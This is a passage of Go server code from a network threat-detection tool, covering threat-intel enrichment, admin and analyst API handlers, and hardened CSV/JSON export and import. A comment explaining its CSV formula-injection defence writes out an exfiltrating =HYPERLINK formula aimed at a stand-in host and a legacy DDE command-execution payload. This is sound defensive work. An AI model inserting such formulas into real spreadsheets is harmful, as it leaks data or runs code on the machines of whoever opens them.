		if svcs["censys"] && cfg.CensysAPIID != "" && cfg.CensysAPISecret != "" && isIP {
			if req, err := http.NewRequest("GET", fmt.Sprintf("https://search.censys.io/api/v2/hosts/%s", dst), nil); err == nil {
				req.SetBasicAuth(cfg.CensysAPIID, cfg.CensysAPISecret)
				req.Header.Set("Accept", "application/json")
				if body, ok := doReq(req); ok {
					var data struct {
						Result struct {
							Services []struct {
								ServiceName string `json:"service_name"`
								Port        int    `json:"port"`
							} `json:"services"`
							LastUpdatedAt string `json:"last_updated_at"`
							Location      struct {
								Country string `json:"country"`
							} `json:"location"`
						} `json:"result"`
					}
					if json.Unmarshal(body, &data) == nil {
						svcCount := len(data.Result.Services)
						if svcCount > 0 {
							// Surface up to three port:service summaries so the
							// note is grep-able without dumping the full payload.
							sample := make([]string, 0, 3)
							for i, s := range data.Result.Services {
								if i >= 3 {
									break
								}
								sample = append(sample, fmt.Sprintf("%d/%s", s.Port, s.ServiceName))
							}
							loc := data.Result.Location.Country
							if loc == "" {
								loc = "unknown"
							}
							publishInfo("Censys", fmt.Sprintf("%s - %d services [%s] (location: %s, last seen %s)",
								dst, svcCount, strings.Join(sample, ", "), loc, data.Result.LastUpdatedAt))
						} else {
							publishClean("Censys", fmt.Sprintf("%s - no record found", dst))
						}
					} else {
						publishClean("Censys", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("Censys", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}
	}

	// Write the consolidated note. Group results per IP so the analyst can
	// scan top-down: header → IP block → service lines. Empty buffer means
	// no service ran (e.g. all IPs filtered, no services selected) — skip
	// the note entirely so the thread doesn't gain a useless empty entry.
	if len(lines) > 0 {
		var b strings.Builder
		fmt.Fprintf(&b, "TI Enrichment Results — %d IP(s), %d hit(s)\n", len(ips), hitCount)
		seen := make(map[string]bool)
		for _, ip := range ips {
			if ip == "" || ip == "—" || ip == "(network)" || seen[ip] {
				continue
			}
			seen[ip] = true
			fmt.Fprintf(&b, "\n[%s]\n", ip)
			for _, ln := range lines {
				if ln.ip == ip {
					fmt.Fprintf(&b, "  %s\n", ln.text)
				}
			}
		}
		s.store.AddNote(f.ID, model.Note{
			Text:        strings.TrimRight(b.String(), "\n"),
			Author:      "TI Enrichment",
			AuthorEmail: "system",
			Timestamp:   ts,
		})
	}

	// Cross-annotate: for every IP with a substantive enrichment result
	// (hit or informative non-hit, e.g. GreyNoise CiscoOpenDNS / Censys
	// service list), attach a per-IP note to all OTHER findings that mention
	// that IP. The originating finding already got the full consolidated
	// note above; this surfaces the enrichment context on related findings
	// so an analyst opening a beacon row sees the TI verdict inline.
	skipIDs := map[int]bool{f.ID: true}
	notedIPs := make(map[string]bool)
	for _, ip := range ips {
		if ip == "" || ip == "—" || ip == "(network)" || notedIPs[ip] {
			continue
		}
		notedIPs[ip] = true
		var b strings.Builder
		fmt.Fprintf(&b, "TI Enrichment — %s", ip)
		any := false
		for _, ln := range lines {
			if ln.ip != ip || !ln.informative {
				continue
			}
			fmt.Fprintf(&b, "\n  %s", ln.text)
			any = true
		}
		if !any {
			continue
		}
		s.crossNoteByIP(ip, model.Note{
			Text:        b.String(),
			Author:      "TI Enrichment",
			AuthorEmail: "system",
			Timestamp:   ts,
		}, skipIDs)
	}

	doneData, _ := json.Marshal(map[string]any{
		"finding_id": f.ID,
		"hits":       hitCount,
	})
	s.broker.Publish(SSEEvent{Type: "ti_done", Data: string(doneData)})
}

func (s *Server) handleConfig(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s.store.GetConfig())
	case http.MethodPut:
		if u := userFromCtx(r); u.Role != model.RoleAdmin {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		cfg := s.store.GetConfig()
		if err := decodeJSONBody(w, r, &cfg, configBodyMaxBytes); err != nil {
			return
		}
		// Off-hours window with start == end silently disabled
		// detection: the wraparound branch (start > end) was false
		// and the standard branch (hour >= X && hour < X) was always
		// false, so off-hours findings simply never fired and admins
		// got no signal that their config disabled a detector.
		// Reject loudly. Audited 2026-05-10.
		if cfg.OffHoursStart == cfg.OffHoursEnd {
			jsonError(w, "off_hours_start and off_hours_end must differ; equal values silently disable off-hours detection", http.StatusBadRequest)
			return
		}
		if cfg.OffHoursStart < 0 || cfg.OffHoursStart > 23 || cfg.OffHoursEnd < 0 || cfg.OffHoursEnd > 23 {
			jsonError(w, "off_hours_start and off_hours_end must be in [0, 23]", http.StatusBadRequest)
			return
		}
		before := s.store.GetConfig()
		s.store.SetConfig(cfg)
		s.recordAudit(r, "config_change", auditEvent{
			TargetType:  "config",
			BeforeValue: configToAuditMap(before),
			AfterValue:  configToAuditMap(cfg),
		})
		jsonOK(w)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleAllowlist(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s.store.GetAllowlist())
	case http.MethodPut:
		if u := userFromCtx(r); u.Role == model.RoleViewer {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		var entries []string
		if err := decodeJSONBody(w, r, &entries, listBodyMaxBytes); err != nil {
			return
		}
		beforeAllow := s.store.GetAllowlist()
		s.store.SetAllowlist(entries)
		added, removed := diffStringSets(beforeAllow, entries)
		s.recordAudit(r, "allowlist_edit", auditEvent{
			TargetType: "allowlist",
			BeforeValue: map[string]any{
				"entry_count": len(beforeAllow),
				"sha256":      hashStringList(beforeAllow),
			},
			AfterValue: map[string]any{
				"entry_count": len(entries),
				"sha256":      hashStringList(entries),
			},
			Details: listEditAuditDetail(added, removed),
		})
		jsonOK(w)
	}
}

func (s *Server) handleIOC(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s.store.GetIOCList())
	case http.MethodPut:
		if u := userFromCtx(r); u.Role == model.RoleViewer {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		var entries []string
		if err := decodeJSONBody(w, r, &entries, listBodyMaxBytes); err != nil {
			return
		}
		beforeIOC := s.store.GetIOCList()
		s.store.SetIOCList(entries)
		added, removed := diffStringSets(beforeIOC, entries)
		s.recordAudit(r, "ioc_edit", auditEvent{
			TargetType: "ioc_list",
			BeforeValue: map[string]any{
				"entry_count": len(beforeIOC),
				"sha256":      hashStringList(beforeIOC),
			},
			AfterValue: map[string]any{
				"entry_count": len(entries),
				"sha256":      hashStringList(entries),
			},
			Details: listEditAuditDetail(added, removed),
		})
		jsonOK(w)
	}
}

func (s *Server) handleSuppressions(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		sups := s.store.GetSuppressions()
		out := make([]map[string]any, 0, len(sups))
		for target, entry := range sups {
			out = append(out, map[string]any{"target": target, "expiry": entry.Expiry.Unix(), "detail": entry.Detail})
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(out)

	case http.MethodPost:
		if u := userFromCtx(r); u.Role == model.RoleViewer {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		var req struct {
			Target string  `json:"target"`
			Days   float64 `json:"days"`
			Detail string  `json:"detail"`
		}
		if err := decodeJSONBody(w, r, &req, suppressBodyMaxBytes); err != nil {
			return
		}
		if strings.TrimSpace(req.Target) == "" {
			jsonError(w, "target is required", http.StatusBadRequest)
			return
		}
		// Bounded validation. Pre-fix only `days > 0` was checked, so
		// {"days": 1e15} caused float→int64 overflow inside
		// time.Duration construction (1e15 * 86400e9 overflows the
		// signed int64 ceiling, wrapping to a negative or pathological
		// value). The resulting expiry could land in the past
		// (suppression immediately false), or thousands of years
		// in the future (suppression effectively forever). NaN/Inf
		// gave undefined-behavior conversions. Both surfaces were
		// soft-DoS / audit-bypass shapes for an analyst who could
		// reach this endpoint. 365-day cap is generous — the longest
		// realistic suppression window — and bounds the duration
		// math comfortably within int64. Audit 2026-05-10 NEW-7.
		if math.IsNaN(req.Days) || math.IsInf(req.Days, 0) {
			jsonError(w, "days must be a finite number", http.StatusBadRequest)
			return
		}
		if req.Days <= 0 || req.Days > 365 {
			jsonError(w, "days must be in (0, 365]", http.StatusBadRequest)
			return
		}
		expiry := time.Now().Add(time.Duration(req.Days * float64(24*time.Hour)))
		s.store.AddSuppression(req.Target, expiry, req.Detail)
		s.recordAudit(r, "suppression_add", auditEvent{
			TargetType: "suppression",
			TargetID:   req.Target,
			TargetName: req.Target,
			AfterValue: map[string]any{
				"days": req.Days, "detail": req.Detail, "expiry": expiry.Unix(),
			},
		})
		jsonOK(w)
	}
}

func (s *Server) handleDeleteSuppression(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if u := userFromCtx(r); u.Role == model.RoleViewer {
		jsonError(w, "forbidden", http.StatusForbidden)
		return
	}
	// Suppression keys are user-supplied identifiers (host/IP/regex)
	// that the frontend percent-encodes into the path. Pre-fix we
	// trimmed the prefix and passed the raw escaped form to the
	// store, so a key containing "/" or "%" never matched the stored
	// entry and the delete silently no-op'd from the analyst's POV.
	// Decode before lookup; reject malformed escapes with 400 instead
	// of guessing. Audit 2026-05-10 LOW.
	raw := strings.TrimPrefix(r.URL.Path, "/api/suppressions/")
	target, err := url.PathUnescape(raw)
	if err != nil {
		jsonError(w, "invalid suppression key", http.StatusBadRequest)
		return
	}
	s.store.RemoveSuppression(target)
	s.recordAudit(r, "suppression_delete", auditEvent{
		TargetType: "suppression",
		TargetID:   target,
		TargetName: target,
	})
	jsonOK(w)
}

func (s *Server) handleNotifications(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s.store.GetNotifications())
	case http.MethodPost:
		var req struct {
			Action string `json:"action"` // "dismiss", "dismiss_all"
			ID     int    `json:"id"`
		}
		if err := decodeJSONBody(w, r, &req, 1<<10); err != nil {
			return
		}
		switch req.Action {
		case "dismiss":
			s.store.DismissNotification(req.ID)
		case "dismiss_all":
			s.store.DismissAllNotifications()
		default:
			// NEW-63: unrecognized action silently returned 200 OK with
			// no observable effect. Clients couldn't tell their request
			// did nothing. Now it's a clear 400.
			jsonError(w, "unknown action — expected dismiss or dismiss_all", http.StatusBadRequest)
			return
		}
		jsonOK(w)
	default:
		// NEW-63: pre-fix any verb other than GET / POST got an empty
		// response that net/http defaulted to 200 OK — confusing API
		// surface. Reject explicitly.
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleWatch(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		watchTime, enabled := s.store.GetWatch()
		tz := s.store.GetTimezone()
		intervalHours := s.store.GetWatchInterval()
		resp := map[string]any{
			"time":           watchTime,
			"enabled":        enabled,
			"timezone":       tz,
			"interval_hours": intervalHours,
		}
		if enabled && watchTime != "" {
			loc := loadLocationOrUTC(tz)
			// Surface the timezone abbreviation (EDT, PST, UTC, …) once,
			// instead of repeating the long IANA name three times across
			// the schedule preview, the next-run line, and the next-full
			// line. Frontend renders the abbrev once on the cadence head
			// and leaves the time strings unadorned.
			abbrev := time.Now().In(loc).Format("MST")
			if abbrev == "" {
				abbrev = "UTC"
			}
			resp["timezone_abbr"] = abbrev

			if next, err := nextOccurrenceInterval(watchTime, intervalHours, loc); err == nil {
				resp["next_run"] = formatRelativeTime(next, loc)

				// Two-tier cadence: derive next_run_kind and next_full_run so
				// the sidebar can tell the analyst whether the upcoming tick
				// is the daily full-pipeline pass or an incremental TI-only
				// pass — matters for "is my beacon detection going to refresh
				// at the next tick?" mental modelling. Mirrors the decision
				// logic in triggerWatchAnalysis (see watch.go).
				//
				// Operator can opt out of the two-tier behavior via the
				// "Always run full scan" toggle in Settings → Watch Mode;
				// when on, every tick is full and the sidebar drops the
				// "Next Full Scan" follow-up line.
				alwaysFull := s.store.GetConfig().WatchAlwaysFull
				lastFull := s.store.GetLastFullAnalysisTime()
				isFullTick := func(t time.Time) bool {
					if alwaysFull || lastFull.IsZero() {
						return true
					}
					utc := t.UTC()
					lf := lastFull.UTC()
					return utc.Year() != lf.Year() || utc.YearDay() != lf.YearDay()
				}
				nextIsFull := isFullTick(next)
				if nextIsFull {
					resp["next_run_kind"] = "full"
					resp["next_full_run"] = resp["next_run"]
				} else {
					resp["next_run_kind"] = "incremental"
					// Walk forward in the cadence until we land on a tick
					// whose UTC date differs from the last full run's date.
					// Bounded search: at hourly cadence the next-day boundary
					// is at most 25 hops away; at 12h cadence at most 3.
					step := time.Duration(intervalHours) * time.Hour
					if intervalHours == 0 || intervalHours == 24 {
						step = 24 * time.Hour
					}
					candidate := next
					for i := 0; i < 30; i++ {
						candidate = candidate.Add(step)
						if isFullTick(candidate) {
							resp["next_full_run"] = formatRelativeTime(candidate, loc)
							break
						}
					}
				}
			}
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)

	case http.MethodPost, http.MethodPut:
		if u := userFromCtx(r); u.Role != model.RoleAdmin {
			jsonError(w, "forbidden", http.StatusForbidden)
			return
		}
		var req struct {
			Time          string `json:"time"`
			Enabled       bool   `json:"enabled"`
			Timezone      string `json:"timezone"`
			IntervalHours int    `json:"interval_hours"`
		}
		if err := decodeJSONBody(w, r, &req, 4<<10); err != nil {
			return
		}
		// Validate HH:MM format when enabling
		if req.Enabled {
			var h, m int
			if ok, _ := parseHHMM(req.Time, &h, &m); !ok {
				jsonError(w, "time must be HH:MM in 24-hour format", http.StatusBadRequest)
				return
			}
		}
		// Validate IANA timezone name. Empty is allowed and means UTC.
		if req.Timezone != "" {
			if _, err := time.LoadLocation(req.Timezone); err != nil {
				jsonError(w, `invalid timezone — use an IANA name like "America/New_York"`, http.StatusBadRequest)
				return
			}
		}
		// Validate interval. 0 (or 24) means daily; otherwise must be one of
		// the supported sub-daily cadences. Anything else gets clamped to 0
		// rather than rejected — the UI is the source of truth here.
		switch req.IntervalHours {
		case 0, 1, 4, 6, 12, 24:
			// ok
		default:
			req.IntervalHours = 0
		}
		beforeTime, beforeEnabled := s.store.GetWatch()
		beforeTZ := s.store.GetTimezone()
		beforeInterval := s.store.GetWatchInterval()
		s.store.SetWatch(req.Time, req.Timezone, req.Enabled, req.IntervalHours)
		if req.Enabled {
			s.startWatch()
		} else {
			s.stopWatch()
		}
		s.recordAudit(r, "watch_change", auditEvent{
			TargetType: "watch",
			BeforeValue: map[string]any{
				"enabled": beforeEnabled, "time": beforeTime,
				"timezone": beforeTZ, "interval_hours": beforeInterval,
			},
			AfterValue: map[string]any{
				"enabled": req.Enabled, "time": req.Time,
				"timezone": req.Timezone, "interval_hours": req.IntervalHours,
			},
		})
		jsonOK(w)

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleArchive(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s.store.GetArchive())

	case http.MethodPost, http.MethodPut:
		if u := userFromCtx(r); u.Role != model.RoleAdmin {
			jsonError(w, "forbidden", http.StatusForbidden)
			return
		}
		var req store.ArchiveSettings
		if err := decodeJSONBody(w, r, &req, 4<<10); err != nil {
			return
		}
		if req.Enabled && req.AfterDays <= 0 {
			jsonError(w, "after_days must be positive when enabling", http.StatusBadRequest)
			return
		}
		s.store.SetArchive(req)
		jsonOK(w)

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleArchiveRun(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	me := userFromCtx(r)
	if me.Role != model.RoleAdmin {
		jsonError(w, "forbidden", http.StatusForbidden)
		return
	}
	settings := s.store.GetArchive()
	if settings.AfterDays <= 0 {
		jsonError(w, "configure archive_after_days before running", http.StatusBadRequest)
		return
	}

	// Empty body = real run; {"dry_run": true} = preview. The body is
	// optional so existing clients that just POST without a body keep
	// working.
	var req struct {
		DryRun bool `json:"dry_run"`
	}
	if r.ContentLength > 0 {
		// Tiny body; decode errors are tolerated (req stays at zero
		// values, which is the "real run, not dry" default — matches
		// the pre-fix shape so existing clients posting empty / bad
		// bodies keep working). Body is still bounded so a hostile
		// caller can't push a multi-MB payload at this endpoint just
		// to have us discard it. We don't use decodeJSONBody here
		// because it writes a response on error, which would conflict
		// with the 202/200 we want to write below; the cap+silent-
		// ignore shape needs MaxBytesReader directly.
		_ = json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<10)).Decode(&req)
	}

	triggeredBy := me.DisplayName()
	if req.DryRun {
		triggeredBy = "" // preview never gets recorded, but be explicit
	}
	res := s.runArchive(settings.AfterDays, settings.PruneFindingsOnArchive, req.DryRun, triggeredBy)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(res)
}

// handleArchiveScan walks /data/archive and runs an IOC + TI-feed
// scan over its contents. Findings merge with the regular finding set
// — the SetFindings fingerprint logic preserves analyst state on any
// hits that were already known. Admin-only, mutually exclusive with a
// regular analysis run.
func (s *Server) handleArchiveScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if u := userFromCtx(r); u.Role != model.RoleAdmin {
		jsonError(w, "forbidden", http.StatusForbidden)
		return
	}
	files := s.scanArchiveDir()
	if len(files) == 0 {
		jsonError(w, "no archived logs to scan", http.StatusBadRequest)
		return
	}
	// launchTIOnly does the atomic TryStartAnalysis claim — see
	// NEW-31 in store.go. We don't separately IsAnalyzing here
	// because the claim is the source of truth; a separate check
	// would just re-introduce the TOCTOU window. On contention
	// launchTIOnly emits an SSE status message and returns; the
	// HTTP response below still says "started" but the SSE is the
	// authoritative signal.
	if !s.launchTIOnly(files) {
		jsonError(w, "another analysis is already in progress", http.StatusConflict)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"status": "started", "files": len(files)})
}

// launchTIOnly is the archive-scan analogue of launchAnalysisWithOptions.
// It runs only the IOC/TI phases of the analyzer, preserves all live
// findings via SetFindings's fingerprint merge, and reuses the regular
// progress/status/done/notification SSE events so the existing UI shows
// the run without any frontend changes.
//
// Returns false if another analysis is already in flight — the caller
// must handle the contention (typically with a 409 Conflict response).
// Audit 2026-05-10 NEW-31.
func (s *Server) launchTIOnly(files []string) bool {
	if !s.store.TryStartAnalysis() {
		return false
	}
	cfg := s.store.GetConfig()
	progressCh := make(chan analysis.ProgressEvent, 32)
	statusCh := make(chan string, 32)

	go func() {
		for evt := range progressCh {
			data, _ := json.Marshal(evt)
			s.broker.Publish(SSEEvent{Type: "progress", Data: string(data)})
		}
	}()
	go func() {
		for msg := range statusCh {
			data, _ := json.Marshal(map[string]string{"msg": msg})
			s.broker.Publish(SSEEvent{Type: "status", Data: string(data)})
		}
	}()

	go func() {
		// Archive scan reuses the /logs/<sensor>/<date>/ layout under
		// /data/archive — so passing archiveDir as the analyzer's path
		// root yields the same sensor names that the live tree would.
		az := analysis.New(cfg, archiveDir, progressCh, statusCh)
		az.SetFeedProvider(s.store)

		s.analyzerMu.Lock()
		s.activeAnalyzer = az
		s.analyzerMu.Unlock()

		defer func() {
			s.analyzerMu.Lock()
			s.activeAnalyzer = nil
			s.analyzerMu.Unlock()
			close(progressCh)
			close(statusCh)
		}()

		findings := az.AnalyzeTIOnly(files)

		// Sensor attribution. Archive preserves the /logs/<sensor>/...
		// layout, so resolving against archiveDir yields the same sensor
		// name that the live tree would have used for these files.
		for i := range findings {
			findings[i].Sensor = sensorFromPath(archiveDir, findings[i].SourceFile)
		}

		newNotifs := s.store.SetFindings(findings)
		s.crossAnnotateNewTIHits(findings)
		for _, n := range newNotifs {
			nData, _ := json.Marshal(n)
			s.broker.Publish(SSEEvent{Type: "notification", Data: string(nData)})
		}

		wasCancelled := az.Ctx().Err() != nil
		newCount := 0
		for _, f := range findings {
			if f.IsNew {
				newCount++
			}
		}
		data, _ := json.Marshal(map[string]any{
			"count":     len(findings),
			"new_count": newCount,
			"cancelled": wasCancelled,
		})
		s.broker.Publish(SSEEvent{Type: "done", Data: string(data)})
	}()
	return true
}

// Exports honor the same query-string filters as /api/findings. Passing no
// parameters exports everything (original behavior); passing filters produces
// a file that matches exactly what the analyst sees on screen.
func (s *Server) handleExportJSON(w http.ResponseWriter, r *http.Request) {
	findings := s.filterFindings(s.store.GetFindings(), r.URL.Query())

	// Strip the per-finding chart data — it's only useful for the in-UI
	// beacon chart, and including it bloats exports by 10-20×. Findings
	// are already a slice of value copies returned by filterFindings, so
	// mutating them here doesn't affect the live store.
	for i := range findings {
		findings[i].TSData = nil
		findings[i].Intervals = nil
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="archer_results_%s.json"`, time.Now().Format("20060102_150405")))

	out := map[string]any{
		"archer_version": version.Version,
		"saved_at":       time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
		"findings":       findings,
	}
	// Allowlist + IOC list are only useful for /api/import round-trips
	// (config restore from a backup). Default exports are scoped to the
	// findings analysts care about; pass ?include_lists=true to opt in.
	if r.URL.Query().Get("include_lists") == "true" {
		out["allowlist"] = s.store.GetAllowlist()
		out["ioc_list"] = s.store.GetIOCList()
	}

	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	enc.Encode(out)
}

// handleVersion exposes the build identifier (release tag, git commit, build
// time) so the UI's About dialog and any external operator tooling can read
// it without going through the export flow. Unauthenticated by design — it's
// diagnostic, not sensitive, and is the same kind of endpoint as a future
// /api/health.
func (s *Server) handleVersion(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	json.NewEncoder(w).Encode(map[string]string{
		"version":    version.Version,
		"commit":     version.Commit,
		"build_time": version.BuildTime,
	})
}

func (s *Server) handleExportCSV(w http.ResponseWriter, r *http.Request) {
	findings := s.filterFindings(s.store.GetFindings(), r.URL.Query())
	w.Header().Set("Content-Type", "text/csv")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="archer_%s.csv"`, time.Now().Format("20060102_150405")))
	cw := csv.NewWriter(w)
	_ = cw.Write([]string{"score", "severity", "type", "src_ip", "dst_ip", "dst_port", "timestamp", "detail", "source_file", "sensor", "status", "analyst", "analyst_note"})
	for _, f := range findings {
		_ = cw.Write([]string{
			strconv.Itoa(f.Score), string(f.Severity), spreadsheetSafe(f.Type),
			spreadsheetSafe(f.SrcIP), spreadsheetSafe(f.DstIP), spreadsheetSafe(f.DstPort),
			spreadsheetSafe(f.Timestamp), spreadsheetSafe(f.Detail),
			spreadsheetSafe(f.SourceFile), spreadsheetSafe(f.Sensor),
			string(f.Status), spreadsheetSafe(f.Analyst), spreadsheetSafe(f.AnalystNote),
		})
	}
	cw.Flush()
}

// spreadsheetSafe defuses CSV / XLSX formula injection: spreadsheet
// applications interpret a cell whose first non-whitespace character is
// =, +, -, @, \t, or \r as a formula. A finding's Detail or AnalystNote
// can plausibly start with one of those — operator-typed notes most
// directly, but Zeek-supplied filenames and URI fragments can too. Real
// world payload: an analyst writes
//
//	=HYPERLINK("https://evil.test/x?d="&A1, "Click")
//
// and the admin opening the export hovers/clicks → row data exfiltrates
// to evil.test. Older Excel had =cmd|'/c calc'!A1 as a DDE-RCE; mostly
// killed by recent Office security defaults but not gone. The OWASP
// mitigation is to prefix the dangerous character with a single quote,
// which Excel/Sheets/LibreOffice treat as a "this is text" hint that
// doesn't survive into the rendered cell. Audit 2026-05-10 NEW-17.
func spreadsheetSafe(v string) string {
	if v == "" {
		return v
	}
	switch v[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + v
	}
	return v
}

// handleImportJSON accepts a previously-exported Archer state bundle and
// replaces the in-memory findings + (optionally) allowlist/IOC list with
// the imported content. Admin-only — see /api/import route comment for
// why analysts can't reach this surface.
//
// Two boundary defenses on top of the role gate. First, the body is
// capped at importMaxBytes; without the cap a malicious or buggy client
// could POST a multi-GB body and exhaust memory before the decode
// finishes. Second, every finding is validated up-front: rejected types,
// severities, scores, or timestamps fail the whole import rather than
// partially applying. Pre-fix the decoder accepted any shape and
// SetFindings would happily store a Type="<script>" finding with
// Score=99999 — the stored representation is then indistinguishable from
// analyzer output once it lives in the DB. Audit 2026-05-10 NEW-14.
const importMaxBytes = 64 << 20 // 64 MiB — large enough for a real export, small enough to bound memory

func (s *Server) handleImportJSON(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var payload struct {
		Findings  []model.Finding `json:"findings"`
		Allowlist []string        `json:"allowlist"`
		IOCList   []string        `json:"ioc_list"`
	}
	// decodeJSONBody centralises the size-cap + 413-on-overflow +
	// no-decoder-internals-in-error-response discipline that NEW-40
	// established. Pre-fix this site reflected raw err.Error() text
	// back to the caller (decoder offsets, character positions) —
	// the exact echo-decoder-internals shape NEW-40 was meant to
	// eliminate for the admin endpoints. NEW-61 closes the gap.
	if err := decodeJSONBody(w, r, &payload, importMaxBytes); err != nil {
		return
	}
	for i, f := range payload.Findings {
		if err := validateImportedFinding(f); err != nil {
			jsonError(w, fmt.Sprintf("findings[%d]: %v", i, err), http.StatusBadRequest)
			return
		}
	}
	for i := range payload.Findings {
		payload.Findings[i].ID = i + 1
	}
	s.store.SetFindings(payload.Findings)
	if len(payload.Allowlist) > 0 {
		s.store.SetAllowlist(payload.Allowlist)
	}
	if len(payload.IOCList) > 0 {
		s.store.SetIOCList(payload.IOCList)
	}
	s.recordAudit(r, "finding_import", auditEvent{
		TargetType: "import",
		Details: map[string]any{
			"findings":  len(payload.Findings),
			"allowlist": len(payload.Allowlist),
			"ioc_list":  len(payload.IOCList),
		},
	})
	jsonOK(w)
}

// validateImportedFinding rejects any finding whose Type, Severity,
// Score, or Timestamp doesn't match the analyzer's output discipline.
// The known-Type set is derived from model.ScoreExplanations (the
// authoritative analyst-facing description map) plus the legacy
// "Threat Intel Hit" string, which pre-v0.7.0 builds may still have in
// exported bundles. Anything else means either an analyzer change that
// forgot to update the map or a hostile/malformed bundle — both
// scenarios are better surfaced as a 400 than silently stored.
func validateImportedFinding(f model.Finding) error {
	if _, ok := model.ScoreExplanations[f.Type]; !ok && f.Type != model.TypeTIHitLegacy {
		return fmt.Errorf("unknown finding type %q", f.Type)
	}
	switch f.Severity {
	case model.SevCritical, model.SevHigh, model.SevMedium, model.SevLow, model.SevInfo:
	default:
		return fmt.Errorf("invalid severity %q", f.Severity)
	}
	if f.Score < 0 || f.Score > 100 {
		return fmt.Errorf("score %d outside [0, 100]", f.Score)
	}
	if f.Timestamp != "" {
		// Same format the analyzer emits everywhere (fmtTS in
		// internal/analysis): "YYYY-MM-DD HH:MM:SS". A bundle
		// produced by a real export round-trips this format, so a
		// stricter schema-level check is safe.
		if _, err := time.Parse("2006-01-02 15:04:05", f.Timestamp); err != nil {
			return fmt.Errorf("timestamp %q must be 2006-01-02 15:04:05", f.Timestamp)
		}
	}
	switch f.Status {
	case model.StatusOpen, model.StatusAcknowledged, model.StatusEscalated:
	default:
		return fmt.Errorf("invalid status %q", f.Status)
	}
	return nil
}

// handleLogsTree returns the sensor/date layout under the configured logs
// directory so the dashboard can render a read-only preview of what watch
// mode and "Analyze sensor logs" will pick up.
func (s *Server) handleLogsTree(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	type dateNode struct {
		Date        string `json:"date"`
		Files       int    `json:"files"`
		SizeBytes   int64  `json:"size_bytes"`
		NewestMtime int64  `json:"newest_mtime"`
	}
	type sensorNode struct {
		Name           string     `json:"name"`
		Dates          []dateNode `json:"dates"`
		TotalFiles     int        `json:"total_files"`
		TotalSizeBytes int64      `json:"total_size_bytes"`
	}
	type response struct {
		LogsDir string       `json:"logs_dir"`
		Sensors []sensorNode `json:"sensors"`
	}

	out := response{LogsDir: s.logsDir, Sensors: []sensorNode{}}
	if s.logsDir == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(out)
		return
	}

	sensorEntries, err := os.ReadDir(s.logsDir)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(out)
		return
	}

	for _, se := range sensorEntries {
		if !se.IsDir() {
			continue
		}
		// Skip the purge bucket — /logs/_archived/<name>-<timestamp>/
		// holds disenrolled sensors' aside-rotated data, intentionally
		// out of scope for the live tree (and for analysis below).
		if se.Name() == "_archived" {
			continue
		}
		sensor := sensorNode{Name: se.Name(), Dates: []dateNode{}}
		sensorPath := filepath.Join(s.logsDir, se.Name())
		dateEntries, err := os.ReadDir(sensorPath)
		if err != nil {
			continue
		}
		for _, de := range dateEntries {
			if !de.IsDir() {
				continue
			}
			node := dateNode{Date: de.Name()}
			datePath := filepath.Join(sensorPath, de.Name())
			fileEntries, err := os.ReadDir(datePath)
			if err != nil {
				continue
			}
			for _, fe := range fileEntries {
				if fe.IsDir() {
					continue
				}
				name := fe.Name()
				if !(strings.HasSuffix(name, ".log") ||
					strings.HasSuffix(name, ".log.gz") ||
					strings.HasSuffix(name, ".gz") ||
					strings.HasSuffix(name, ".json") ||
					strings.HasSuffix(name, ".ndjson")) {
					continue
				}
